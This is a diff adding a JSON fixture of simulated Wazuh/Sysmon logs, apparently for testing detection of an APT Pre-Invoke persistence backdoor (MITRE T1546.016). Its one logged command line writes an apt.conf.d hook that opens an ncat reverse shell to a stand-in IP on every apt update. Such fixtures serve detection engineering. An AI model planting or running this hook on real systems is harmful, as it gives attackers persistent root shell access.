@@ -1,0 +1,69 @@
+{
+  "_metadata": {
+    "attack_id": "T1546.016",
+    "variation": "001",
+    "name": "APT Package Manager Pre-Invoke Backdoor",
+    "description": "Creating a malicious APT configuration in /etc/apt/apt.conf.d/ that executes a reverse shell during apt-get update/install operations via Pre-Invoke hook",
+    "expected_detection": "HIGH",
+    "kill_chain_phase": "persistence",
+    "format": "wazuh-native",
+    "format_version": "1.0"
+  },
+  "logs": [
+    {
+      "_comment": "Sysmon Event 1 - bash creating APT backdoor config",
+      "sequence": 1,
+      "timestamp": "2026-02-22T02:06:19.500Z",
+      "log": {
+        "rule": {
+          "level": 8,
+          "description": "Sysmon - Event 1: Process creation /usr/bin/bash",
+          "id": "100101",
+          "mitre": {
+            "id": [
+              "T1546.016"
+            ],
+            "tactic": [
+              "Persistence"
+            ],
+            "technique": [
+              "Event Triggered Execution: Installer Packages"
+            ]
+          },
+          "firedtimes": 1,
+          "mail": false,
+          "groups": [
+            "linux",
+            "sysmon",
+            "sysmon_event1"
+          ]
+        },
+        "agent": {
+          "id": "030",
+          "name": "VULN01",
+          "ip": "198.51.100.30"
+        },
+        "manager": {
+          "name": "wazuh.manager"
+        },
+        "id": "1700000022.C22006",
+        "decoder": {
+          "name": "json"
+        },
+        "location": "EventChannel",
+        "data": {
+          "eventdata": {
+            "utcTime": "2026-02-22 02:06:19.500",
+            "processId": "48215",
+            "image": "/usr/bin/bash",
+            "commandLine": "bash -c cat > /etc/apt/apt.conf.d/42backdoor << EOF\nAPT::Update::Pre-Invoke {\"ncat 198.51.100.40 4242 -e /bin/bash 2>/dev/null &\"};\nEOF",
+            "currentDirectory": "/home/admin2",
+            "user": "root",
+            "parentImage": "/usr/bin/sudo",
+            "parentCommandLine": "sudo -S bash -c cat > /etc/apt/apt.conf.d/42backdoor"
+          }
+        }
+      }
+    }
+  ]
+}
